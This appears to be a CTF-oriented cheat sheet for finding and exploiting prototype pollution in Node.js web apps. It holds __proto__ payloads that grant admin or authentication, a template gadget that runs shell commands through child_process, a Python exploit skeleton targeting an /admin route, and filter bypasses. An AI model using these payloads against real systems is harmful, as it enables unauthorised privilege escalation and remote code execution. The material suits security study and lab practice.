# Web Prototype Pollution

## When to suspect this

- Node.js app accepts JSON and deep-merges user objects.
- Parameters include nested objects, settings, profile, theme, config, metadata.
- Source uses `lodash.merge`, `deepmerge`, `qs`, `flat`, `flatnest`, custom recursive merge.
- Behavior changes globally after one request.
- Template/rendering engine reads options from objects.

## Fast triage checklist

- Confirm Node/JS backend.
- Identify JSON/object input endpoint.
- Send harmless pollution like `{"__proto__":{"polluted":"yes"}}`.
- Check if subsequent response reflects inherited property.
- Search source for gadgets: `isAdmin`, template options, `child_process`, `pug`, `ejs`, `vm`.
- Test `constructor.prototype` if `__proto__` is blocked.
- Distinguish client-side pollution from server-side pollution.

## Manual confirmation

```bash
curl -sk -X POST http://HOST/api/profile \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"polluted":"yes"}}'

curl -sk http://HOST/api/me | rg 'polluted|yes|admin'
```

Alternate:

```json
{"constructor":{"prototype":{"isAdmin":true}}}
```

## Tools and resources to use

| Tool / Script / Resource | When to use | Example command | Expected signal |
|---|---|---|---|
| `curl` | Manual pollution probes | POST JSON with `__proto__` | New inherited behavior |
| Burp Repeater | Stateful testing | Send pollution then check target route | Persistent change |
| `jq` | Payload editing | `jq . payload.json` | Valid JSON |
| Source notes | Gadget selection | [ctf-web/node-and-prototype.md](../ctf-web/node-and-prototype.md) | Known gadget path |

## Payload starter pack

Detection:

```json
{"__proto__":{"polluted":"yes"}}
{"constructor":{"prototype":{"polluted":"yes"}}}
{"prototype":{"polluted":"yes"}}
```

Auth gadgets:

```json
{"__proto__":{"isAdmin":true}}
{"__proto__":{"role":"admin"}}
{"__proto__":{"authenticated":true}}
```

Template gadgets:

```json
{"__proto__":{"client":true,"escapeFunction":"function(){return process.mainModule.require('child_process').execSync('id').toString()}" }}
```

## Exploit skeleton

```python
#!/usr/bin/env python3
import requests

BASE = "http://HOST"
COOKIE = {"session": "COOKIE"}

pollute = {"__proto__": {"isAdmin": True, "polluted": "yes"}}
r = requests.post(BASE + "/api/profile", json=pollute, cookies=COOKIE, timeout=10)
print("pollute", r.status_code, r.text[:500])

r = requests.get(BASE + "/admin", cookies=COOKIE, timeout=10)
print("admin", r.status_code, r.text[:2000])
```

## Escalation path

- If harmless property appears, hunt gadgets.
- Try authz properties first.
- If rendering library exists, test template option gadgets.
- If `vm`/sandbox is used, look for escape path.
- If pollution is client-side only, pivot to DOM XSS.

## Common bypasses

- `constructor.prototype` instead of `__proto__`.
- URL encoded nested query: `?__proto__[isAdmin]=true`.
- Dot notation: `__proto__.isAdmin=true`.
- JSON arrays with object merge edge cases.
- Case variations and null byte path components.

## Rabbit holes

- Assuming pollution exists without observing a gadget.
- Confusing client-side pollution with server-side privilege.
- Trying RCE gadgets before auth/admin gadgets.
- Missing that pollution may reset per request/process.

## Final solve checklist

- Pollution primitive is proven with harmless key.
- Gadget is identified and tied to target behavior.
- Exploit is stable in a fresh session/process.
- Final request obtains flag or admin action.

